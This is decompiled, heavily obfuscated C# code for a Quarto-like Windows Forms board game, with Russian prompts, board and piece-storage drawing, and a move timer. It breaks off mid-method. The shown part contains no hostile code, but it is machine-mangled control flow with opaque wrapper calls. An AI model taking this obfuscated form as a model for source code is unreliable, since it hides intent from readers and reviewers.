using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_0250: Unknown result type (might be due to invalid IL or missing references)
		//IL_025a: Expected O, but got Unknown
		int num3 = default(int);
		int num5 = default(int);
		double num10 = default(double);
		while (true)
		{
			int num = -891140395;
			while (true)
			{
				uint num2;
				double num4;
				switch ((num2 = (uint)num ^ 0xF34AE6FBu) % 23u)
				{
				case 22u:
				{
					PictureBox[,] array2 = pictureBox;
					int num11 = num3;
					int num12 = num5;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj2, new Point(4 + (int)(((double)num5 + num10) * (double)size), 4 + num3 * size));
					Form1.smethod_5((Control)(object)obj2, Color.White);
					array2[num11, num12] = obj2;
					num = ((int)num2 * -2006189703) ^ -328138159;
					continue;
				}
				case 20u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = ((int)num2 * -1921953935) ^ 0x2D35884C;
					continue;
				}
				case 19u:
					num = -726545615;
					continue;
				case 18u:
				{
					PictureBox[,] array = borderBox;
					int num8 = num3;
					int num9 = num5;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj, new Point(1 + (int)(((double)num5 + num10) * (double)size), 1 + num3 * size));
					Form1.smethod_7((Control)(object)obj, bool_0: false);
					array[num8, num9] = obj;
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num3, num5]);
					num = (int)((num2 * 1583682631) ^ 0x4AD7AE67);
					continue;
				}
				case 17u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num3, num5]);
					num = (int)(num2 * 837779157) ^ -2029575825;
					continue;
				case 16u:
					pictureBox = new PictureBox[4, 4];
					borderBox = new PictureBox[4, 4];
					num = (int)((num2 * 755553306) ^ 0x100F0990);
					continue;
				case 15u:
					if (num5 >= 2)
					{
						num = ((int)num2 * -340181604) ^ 0x379BE63F;
						continue;
					}
					num4 = 0.0;
					goto IL_01c8;
				case 14u:
					num5 = 0;
					num = -857985589;
					continue;
				case 13u:
					num3 = 0;
					num = (int)((num2 * 533208082) ^ 0x294C13CF);
					continue;
				case 12u:
					num = ((int)num2 * -1703728546) ^ -2104049523;
					continue;
				case 11u:
					num = (int)((num2 * 143958418) ^ 0x11EAFED8);
					continue;
				case 10u:
				{
					int num7;
					if (num3 < 4)
					{
						num = -1160329692;
						num7 = -1160329692;
					}
					else
					{
						num = -525073619;
						num7 = -525073619;
					}
					continue;
				}
				case 8u:
					Form1.smethod_6((Control)(object)pictureBox[num3, num5], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = ((int)num2 * -1677280008) ^ -502779742;
					continue;
				case 7u:
					num = ((int)num2 * -496851026) ^ 0x75C39351;
					continue;
				case 6u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = ((int)num2 * -920307453) ^ 0x2310F38F;
					continue;
				case 5u:
				{
					int num6;
					if (num5 >= 4)
					{
						num = -726017455;
						num6 = -726017455;
					}
					else
					{
						num = -1129013473;
						num6 = -1129013473;
					}
					continue;
				}
				case 4u:
					num5++;
					num = ((int)num2 * -1667533940) ^ 0x47CADAEF;
					continue;
				case 3u:
					num4 = 4.1;
					goto IL_01c8;
				case 2u:
					num3++;
					num = ((int)num2 * -2032690219) ^ -1503819061;
					continue;
				case 1u:
					Form1.smethod_11((Control)(object)menu);
					num = (int)(num2 * 277081675) ^ -100147996;
					continue;
				case 0u:
					InitializeComponent();
					num = ((int)num2 * -1745069566) ^ -488472182;
					continue;
				default:
					return;
				case 9u:
					break;
				case 21u:
					return;
					IL_01c8:
					num10 = num4;
					num = -2027158732;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = -668732516;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD713C9C8u) % 3u)
				{
				case 1u:
					goto IL_000d;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_000d:
				num = ((int)num2 * -143182829) ^ -1394190851;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		bool flag = default(bool);
		while (true)
		{
			int num = 1283359443;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x54A6CD4u) % 10u)
				{
				case 9u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 1331283021;
						num4 = 1331283021;
					}
					else
					{
						num3 = 193016839;
						num4 = 193016839;
					}
					num = num3 ^ ((int)num2 * -1048737962);
					continue;
				}
				case 7u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 1069826073;
					continue;
				case 6u:
					num = ((int)num2 * -1768143625) ^ 0x7429A798;
					continue;
				case 5u:
					num = (int)(num2 * 1294895610) ^ -2138695569;
					continue;
				case 4u:
					num = (int)((num2 * 596654088) ^ 0x6B5EA549);
					continue;
				case 3u:
					num = 252068898;
					continue;
				case 2u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = (int)((num2 * 1816370956) ^ 0x3916E6C2);
					continue;
				}
				case 1u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -11175828) ^ 0x648A409E;
					continue;
				default:
					return;
				case 8u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		bool flag = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		while (true)
		{
			int num = 357161;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1F919C12u) % 18u)
				{
				case 17u:
					Paint_Board();
					num = (int)(num2 * 1911035591) ^ -1135788036;
					continue;
				case 16u:
					Paint_Storage();
					num = (int)((num2 * 1321883519) ^ 0x51720438);
					continue;
				case 15u:
				{
					int num6;
					int num7;
					if (flag)
					{
						num6 = -359199644;
						num7 = -359199644;
					}
					else
					{
						num6 = -42238038;
						num7 = -42238038;
					}
					num = num6 ^ (int)(num2 * 265391127);
					continue;
				}
				case 14u:
					num3++;
					num = (int)(num2 * 30583083) ^ -276340904;
					continue;
				case 12u:
					num = (int)(num2 * 1873266117) ^ -15247965;
					continue;
				case 10u:
					num = 2098587224;
					continue;
				case 9u:
					num4 = 0;
					num = 1495837064;
					continue;
				case 8u:
					num4++;
					num = ((int)num2 * -1139179226) ^ 0x48126249;
					continue;
				case 7u:
					num3 = 0;
					num = ((int)num2 * -1541930882) ^ 0x3EDBEFF8;
					continue;
				case 6u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -2007705315) ^ -665054112;
					continue;
				case 5u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 15248923) ^ 0x59C7CA2B);
					continue;
				case 4u:
					flag = num3 < 4;
					num = 142632005;
					continue;
				case 3u:
					storage = new Figurine[4, 4];
					num = ((int)num2 * -23017729) ^ -597504174;
					continue;
				case 2u:
					num = ((int)num2 * -1027384495) ^ 0xF001E7;
					continue;
				case 1u:
				{
					int num5;
					if (num4 < 4)
					{
						num = 1930551588;
						num5 = 1930551588;
					}
					else
					{
						num = 1686517392;
						num5 = 1686517392;
					}
					continue;
				}
				case 0u:
					storage[num3, num4] = new Figurine(num3 < 2, num4 % 2 == 0, num4 < 2, num3 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = (int)(num2 * 377676320) ^ -192905938;
					continue;
				default:
					return;
				case 13u:
					break;
				case 11u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		bool big = default(bool);
		Graphics graphics_ = default(Graphics);
		float num14 = default(float);
		int num4 = default(int);
		int num3 = default(int);
		float num15 = default(float);
		Brush brush_ = default(Brush);
		float num12 = default(float);
		float num5 = default(float);
		float num13 = default(float);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool point = default(bool);
		bool dark = default(bool);
		while (true)
		{
			int num = 126613160;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x125257FAu) % 42u)
				{
				case 41u:
				{
					int num22;
					int num23;
					if (big)
					{
						num22 = -1109047353;
						num23 = -1109047353;
					}
					else
					{
						num22 = -441212270;
						num23 = -441212270;
					}
					num = num22 ^ ((int)num2 * -1179032346);
					continue;
				}
				case 40u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = ((int)num2 * -558138842) ^ -1363746355;
					continue;
				case 38u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num14 + (float)(num4 * size), num14 + (float)(num3 * size), num15, num15);
					num = ((int)num2 * -1571878601) ^ -1103627286;
					continue;
				case 37u:
					num = ((int)num2 * -248750730) ^ -261392619;
					continue;
				case 36u:
					brush_ = Form1.smethod_26();
					num = 929267112;
					continue;
				case 35u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1677499196) ^ -973135381;
					continue;
				case 34u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num3 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 2008247432) ^ 0x36756549);
					continue;
				case 33u:
				{
					int num18;
					int num19;
					if (board[num3, num4].Square)
					{
						num18 = 1331795917;
						num19 = 1331795917;
					}
					else
					{
						num18 = 1602421089;
						num19 = 1602421089;
					}
					num = num18 ^ ((int)num2 * -280999162);
					continue;
				}
				case 32u:
					num = ((int)num2 * -1708903147) ^ -1923065409;
					continue;
				case 31u:
					num12 = 1f - num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num13 = (float)size * num5;
					num = 997980752;
					continue;
				case 30u:
				{
					int num8;
					int num9;
					if (flag)
					{
						num8 = -821448647;
						num9 = -821448647;
					}
					else
					{
						num8 = -856262115;
						num9 = -856262115;
					}
					num = num8 ^ (int)(num2 * 344196267);
					continue;
				}
				case 29u:
					num3++;
					num = ((int)num2 * -916139838) ^ -96824591;
					continue;
				case 28u:
					num = ((int)num2 * -1052345526) ^ -1129029603;
					continue;
				case 27u:
					flag2 = num3 < 4;
					num = 945802880;
					continue;
				case 26u:
					num14 = (float)size * (num12 / 2f);
					num = ((int)num2 * -1097435566) ^ 0x27EEDAD1;
					continue;
				case 25u:
					Form1.smethod_28(graphics_, brush_, num14 + (float)(num4 * size), num14 + (float)(num3 * size), num15, num15);
					num = (int)(num2 * 1334669568) ^ -145609626;
					continue;
				case 24u:
					point = board[num3, num4].Point;
					num = (int)(num2 * 2040285690) ^ -1491173884;
					continue;
				case 23u:
					num = (int)((num2 * 902716249) ^ 0x1361BFB);
					continue;
				case 22u:
					num5 = 0.7f;
					num = 396276375;
					continue;
				case 21u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 935541120) ^ 0x11047B28);
					continue;
				case 20u:
					num4 = 0;
					num = 1275138272;
					continue;
				case 19u:
					num15 = num13 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 529840975) ^ 0x118EE5B4);
					continue;
				case 18u:
				{
					int num20;
					int num21;
					if (!flag2)
					{
						num20 = -1284603615;
						num21 = -1284603615;
					}
					else
					{
						num20 = -135368334;
						num21 = -135368334;
					}
					num = num20 ^ (int)(num2 * 533791906);
					continue;
				}
				case 17u:
					num = (int)((num2 * 1868133817) ^ 0x398657A9);
					continue;
				case 16u:
					flag = num4 < 4;
					num = 1301288872;
					continue;
				case 15u:
					num4++;
					num = 1385540810;
					continue;
				case 14u:
					dark = board[num3, num4].Dark;
					num = ((int)num2 * -1887116510) ^ -405977211;
					continue;
				case 13u:
					num = 1302471923;
					continue;
				case 12u:
				{
					int num16;
					int num17;
					if (!point)
					{
						num16 = 1691210549;
						num17 = 1691210549;
					}
					else
					{
						num16 = 1884914632;
						num17 = 1884914632;
					}
					num = num16 ^ ((int)num2 * -1025537373);
					continue;
				}
				case 11u:
					Form1.smethod_24(graphics_, brush_, num14 + (float)(num4 * size), num14 + (float)(num3 * size), num15, num15);
					num = 1014205166;
					continue;
				case 10u:
					num = (int)(num2 * 1986978805) ^ -193022680;
					continue;
				case 9u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num3 = 0;
					num = ((int)num2 * -732813254) ^ -185402035;
					continue;
				case 8u:
					num12 = 1f - num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num14 = (float)size * (num12 / 2f);
					num15 = num13 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 1644015028;
					continue;
				case 7u:
				{
					int num10;
					int num11;
					if (board[num3, num4] == null)
					{
						num10 = -1860965431;
						num11 = -1860965431;
					}
					else
					{
						num10 = -313168488;
						num11 = -313168488;
					}
					num = num10 ^ ((int)num2 * -933495362);
					continue;
				}
				case 6u:
					num = (int)(num2 * 1109852913) ^ -839081525;
					continue;
				case 5u:
				{
					int num6;
					int num7;
					if (dark)
					{
						num6 = -1998620266;
						num7 = -1998620266;
					}
					else
					{
						num6 = -1317808665;
						num7 = -1317808665;
					}
					num = num6 ^ ((int)num2 * -1802289459);
					continue;
				}
				case 4u:
					num = ((int)num2 * -2053671373) ^ -470897950;
					continue;
				case 3u:
					num5 = 1f;
					num = ((int)num2 * -1212977465) ^ 0x330CE1DF;
					continue;
				case 1u:
					num = 642703724;
					continue;
				case 0u:
					big = board[num3, num4].Big;
					num = 2019587489;
					continue;
				default:
					return;
				case 39u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		int num4 = default(int);
		Graphics graphics_ = default(Graphics);
		float num6 = default(float);
		float num5 = default(float);
		Brush brush_ = default(Brush);
		bool big = default(bool);
		float num11 = default(float);
		float num8 = default(float);
		float num7 = default(float);
		while (true)
		{
			int num2 = 174745568;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x321FDD20u) % 37u)
				{
				case 36u:
					num2 = ((int)num3 * -1640489936) ^ -248357914;
					continue;
				case 35u:
				{
					int num18;
					int num19;
					if (storage[num, num4].Point)
					{
						num18 = 876044721;
						num19 = 876044721;
					}
					else
					{
						num18 = 738602365;
						num19 = 738602365;
					}
					num2 = num18 ^ ((int)num3 * -1987282843);
					continue;
				}
				case 34u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num4]));
					num2 = ((int)num3 * -690214041) ^ -256201969;
					continue;
				case 33u:
					num6 = (float)size * num5;
					num2 = (int)((num3 * 1828446799) ^ 0x2987B5CD);
					continue;
				case 32u:
					num2 = (int)(num3 * 1945957253) ^ -1915701517;
					continue;
				case 31u:
				{
					int num15;
					if (num >= 4)
					{
						num2 = 1848974313;
						num15 = 1848974313;
					}
					else
					{
						num2 = 1200832322;
						num15 = 1200832322;
					}
					continue;
				}
				case 30u:
					brush_ = Form1.smethod_26();
					num2 = 697248390;
					continue;
				case 29u:
					big = storage[num, num4].Big;
					num2 = 628529891;
					continue;
				case 28u:
					Form1.smethod_20(pictureBox[num, num4], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num4]), Form1.smethod_16((Control)(object)pictureBox[num, num4])));
					num2 = (int)(num3 * 2120302284) ^ -215730151;
					continue;
				case 27u:
					Form1.smethod_30((Control)(object)pictureBox[num, num4]);
					num2 = 1000498494;
					continue;
				case 26u:
					num2 = ((int)num3 * -352616296) ^ -250652194;
					continue;
				case 25u:
				{
					int num20;
					if (storage[num, num4] == null)
					{
						num2 = 979476538;
						num20 = 979476538;
					}
					else
					{
						num2 = 1115160921;
						num20 = 1115160921;
					}
					continue;
				}
				case 24u:
					num11 = 1f - num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num8 = (float)size * (num11 / 2f) - 4f;
					num2 = 145993369;
					continue;
				case 23u:
				{
					int num16;
					int num17;
					if (num4 < 2)
					{
						num16 = -46829990;
						num17 = -46829990;
					}
					else
					{
						num16 = -1134922338;
						num17 = -1134922338;
					}
					num2 = num16 ^ ((int)num3 * -860037190);
					continue;
				}
				case 22u:
				{
					int num13;
					int num14;
					if (!storage[num, num4].Dark)
					{
						num13 = 4172723;
						num14 = 4172723;
					}
					else
					{
						num13 = 1206617265;
						num14 = 1206617265;
					}
					num2 = num13 ^ ((int)num3 * -679496879);
					continue;
				}
				case 21u:
					num11 = 1f - num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = 1538672801;
					continue;
				case 20u:
					brush_ = Form1.smethod_25();
					num2 = (int)((num3 * 1837734344) ^ 0x2AFEC7BA);
					continue;
				case 19u:
					num++;
					num2 = (int)(num3 * 325461763) ^ -1147653432;
					continue;
				case 18u:
				{
					int num12;
					if (num4 >= 4)
					{
						num2 = 939064978;
						num12 = 939064978;
					}
					else
					{
						num2 = 251567954;
						num12 = 251567954;
					}
					continue;
				}
				case 16u:
					Form1.smethod_24(graphics_, brush_, num8, num8, num7, num7);
					num2 = 117284184;
					continue;
				case 15u:
					num5 = 1f;
					num2 = ((int)num3 * -1771720533) ^ -1433148965;
					continue;
				case 14u:
					num4++;
					num2 = 144717443;
					continue;
				case 13u:
					num2 = (int)(num3 * 1987922170) ^ -1603079545;
					continue;
				case 12u:
					num8 = (float)size * (num11 / 2f) - 4f;
					num2 = ((int)num3 * -184077494) ^ -1970793398;
					continue;
				case 11u:
					num2 = ((int)num3 * -554097746) ^ -1842569634;
					continue;
				case 10u:
				{
					int num9;
					int num10;
					if (!big)
					{
						num9 = 891461872;
						num10 = 891461872;
					}
					else
					{
						num9 = 1759667625;
						num10 = 1759667625;
					}
					num2 = num9 ^ ((int)num3 * -653794751);
					continue;
				}
				case 9u:
					num2 = (int)(num3 * 851477073) ^ -641675110;
					continue;
				case 8u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num8, num8, num7, num7);
					num2 = (int)((num3 * 362641769) ^ 0x2A7D2730);
					continue;
				case 7u:
					num7 = num6 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -839079854) ^ 0x1D36E42B;
					continue;
				case 5u:
					Form1.smethod_28(graphics_, brush_, num8, num8, num7, num7);
					num2 = ((int)num3 * -1938818366) ^ 0x535C0AC8;
					continue;
				case 4u:
					num2 = (int)((num3 * 1627240776) ^ 0x3D076DD0);
					continue;
				case 3u:
					num2 = (int)(num3 * 44176307) ^ -1872314649;
					continue;
				case 2u:
					num7 = num6 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -1231345720) ^ 0x67B7F534;
					continue;
				case 1u:
					num5 = 0.7f;
					num2 = 1992288383;
					continue;
				case 0u:
					num4 = 0;
					num2 = 144717443;
					continue;
				default:
					return;
				case 6u:
					break;
				case 17u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		int num3 = default(int);
		int num8 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		int num9 = default(int);
		int num10 = default(int);
		while (true)
		{
			int num = -1560529159;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB3EFA060u) % 28u)
				{
				case 27u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = ((int)num2 * -541111148) ^ 0x1A1A1C76;
					continue;
				case 25u:
					num = (int)(num2 * 186032158) ^ -2108648978;
					continue;
				case 24u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -1228763949) ^ -646268897;
					continue;
				case 23u:
					num3 = 0;
					num = -981355208;
					continue;
				case 22u:
					Form1.smethod_7((Control)(object)pictureBox[num8, num3], bool_0: true);
					num = -131021662;
					continue;
				case 21u:
				{
					int num6;
					int num7;
					if (!flag2)
					{
						num6 = -365753124;
						num7 = -365753124;
					}
					else
					{
						num6 = -1949791137;
						num7 = -1949791137;
					}
					num = num6 ^ (int)(num2 * 538321992);
					continue;
				}
				case 20u:
					flag = num3 < 4;
					num = -1704046849;
					continue;
				case 19u:
					num9 = Form1.smethod_33(rnd, 4);
					num10 = Form1.smethod_33(rnd, 4);
					num = -2137643696;
					continue;
				case 18u:
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)((num2 * 735628174) ^ 0xED3B1F1);
					continue;
				case 17u:
				{
					int num11;
					int num12;
					if (turn)
					{
						num11 = 1568601;
						num12 = 1568601;
					}
					else
					{
						num11 = 412836042;
						num12 = 412836042;
					}
					num = num11 ^ (int)(num2 * 390793521);
					continue;
				}
				case 16u:
					num = (int)(num2 * 1143268531) ^ -928778858;
					continue;
				case 15u:
					num = (int)((num2 * 1430183856) ^ 0x295B57A9);
					continue;
				case 14u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 450250231) ^ 0x12040D3B);
					continue;
				case 13u:
					step = 0;
					num = ((int)num2 * -2057633062) ^ 0x155186FE;
					continue;
				case 12u:
					Form1.smethod_5((Control)(object)borderBox[num9, num10], Color.Blue);
					num = (int)(num2 * 420814128) ^ -294200556;
					continue;
				case 11u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -852175449;
					continue;
				case 9u:
					step = 1;
					num = ((int)num2 * -2041227880) ^ 0x531F271B;
					continue;
				case 8u:
					num = ((int)num2 * -523235286) ^ 0x546B22AB;
					continue;
				case 7u:
					num8++;
					num = ((int)num2 * -1056413899) ^ 0x15CACD53;
					continue;
				case 6u:
					num8 = 0;
					num = ((int)num2 * -1740215673) ^ -388453713;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -939165791) ^ 0x3508E6E8;
					continue;
				case 4u:
					flag2 = num8 < 4;
					num = -899741907;
					continue;
				case 3u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -369545376;
						num5 = -369545376;
					}
					else
					{
						num4 = -729973507;
						num5 = -729973507;
					}
					num = num4 ^ (int)(num2 * 1123660214);
					continue;
				}
				case 2u:
					num3++;
					num = (int)(num2 * 1844445580) ^ -1460770528;
					continue;
				case 1u:
					num = (int)((num2 * 281341320) ^ 0x4DAD402A);
					continue;
				case 0u:
					num = ((int)num2 * -1113657301) ^ -1570627198;
					continue;
				case 10u:
					break;
				default:
					Form1.smethod_36(timer1);
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 2093030979;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x64BE47BCu) % 4u)
				{
				case 3u:
					time = time.AddSeconds(1.0);
					num = ((int)num2 * -1265908020) ^ 0x52495CBC;
					continue;
				case 0u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = ((int)num2 * -740868288) ^ 0x7A56C551;
					continue;
				default:
					return;
				case 2u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0209: Unknown result type (might be due to invalid IL or missing references)
		//IL_021f: Expected O, but got Unknown
		bool flag4 = default(bool);
		int num4 = default(int);
		Point point = default(Point);
		bool flag2 = default(bool);
		int num5 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		bool flag3 = default(bool);
		int num6 = default(int);
		while (true)
		{
			int num = 1506433971;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0x5FA28771u) % 28u)
				{
				case 27u:
				{
					int num14;
					int num15;
					if (flag4)
					{
						num14 = -533047777;
						num15 = -533047777;
					}
					else
					{
						num14 = -1629370646;
						num15 = -1629370646;
					}
					num = num14 ^ ((int)num2 * -333837547);
					continue;
				}
				case 26u:
					flag4 = num4 > 1;
					num = (int)((num2 * 955773537) ^ 0x721403F0);
					continue;
				case 25u:
					num4 = point.X / size;
					num = ((int)num2 * -184603307) ^ 0x27CE06B2;
					continue;
				case 24u:
				{
					int num12;
					int num13;
					if (!flag2)
					{
						num12 = -186238390;
						num13 = -186238390;
					}
					else
					{
						num12 = -1640059011;
						num13 = -1640059011;
					}
					num = num12 ^ ((int)num2 * -948563426);
					continue;
				}
				case 22u:
					num5 = 0;
					num = ((int)num2 * -264142383) ^ -1610258434;
					continue;
				case 21u:
					num = ((int)num2 * -872921068) ^ -610411581;
					continue;
				case 20u:
					if (storage[num3, num4] != null)
					{
						num = 1502887167;
						continue;
					}
					num7 = 0;
					goto IL_00d4;
				case 19u:
				{
					int num10;
					int num11;
					if (!flag)
					{
						num10 = -237297307;
						num11 = -237297307;
					}
					else
					{
						num10 = -1543714140;
						num11 = -1543714140;
					}
					num = num10 ^ ((int)num2 * -24982056);
					continue;
				}
				case 18u:
					num = ((int)num2 * -298547367) ^ -237607964;
					continue;
				case 17u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 1060922989) ^ 0x7EBDCA89);
					continue;
				case 16u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)(num2 * 212546388) ^ -1721190956;
					continue;
				case 15u:
				{
					int num8;
					int num9;
					if (!flag3)
					{
						num8 = -1994983877;
						num9 = -1994983877;
					}
					else
					{
						num8 = -825069902;
						num9 = -825069902;
					}
					num = num8 ^ ((int)num2 * -815259585);
					continue;
				}
				case 14u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)(num2 * 1928756046) ^ -1841875953;
					continue;
				case 13u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)((num2 * 1879589116) ^ 0x3C53E7B8);
					continue;
				case 12u:
					num6++;
					num = ((int)num2 * -2129280188) ^ 0x61245945;
					continue;
				case 11u:
					num5++;
					num = ((int)num2 * -1759650049) ^ 0x54166CC2;
					continue;
				case 10u:
					num7 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num3, num4]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_00d4;
				case 9u:
					num6 = 0;
					num = 1306719378;
					continue;
				case 8u:
					flag2 = num6 < 4;
					num = 1940365345;
					continue;
				case 7u:
					num = ((int)num2 * -1876402263) ^ -513800802;
					continue;
				case 6u:
					flag = num5 < 4;
					num = 1992342986;
					continue;
				case 5u:
					num = (int)((num2 * 1987299509) ^ 0x49BAD8BE);
					continue;
				case 4u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.White);
					num = 1027834673;
					continue;
				case 2u:
					num3 = point.Y / size;
					num = ((int)num2 * -1104713444) ^ -815607391;
					continue;
				case 1u:
					num4 -= 4;
					num = ((int)num2 * -119528320) ^ -653154579;
					continue;
				case 0u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.Red);
					num = (int)((num2 * 2026347301) ^ 0x56E4BDC4);
					continue;
				default:
					return;
				case 23u:
					break;
				case 3u:
					return;
					IL_00d4:
					flag3 = (byte)num7 != 0;
					num = 1676518518;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_029f: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b5: Expected O, but got Unknown
		int num7 = default(int);
		int num3 = default(int);
		bool flag2 = default(bool);
		Graphics graphics_ = default(Graphics);
		int num12 = default(int);
		int num13 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -336162458;
			while (true)
			{
				uint num2;
				int num8;
				switch ((num2 = (uint)num ^ 0xDB650161u) % 28u)
				{
				case 27u:
				{
					int num11;
					if (!(Form1.smethod_41((Control)(object)borderBox[num7, num3]) == Color.Blue))
					{
						num = -731948947;
						num11 = -731948947;
					}
					else
					{
						num = -970030316;
						num11 = -970030316;
					}
					continue;
				}
				case 26u:
					flag2 = num7 < 4;
					num = -687397318;
					continue;
				case 25u:
					num = (int)((num2 * 969518899) ^ 0x77D110D2);
					continue;
				case 23u:
					num = ((int)num2 * -646053665) ^ -83960192;
					continue;
				case 21u:
					num = (int)((num2 * 223532825) ^ 0x56C8BA30);
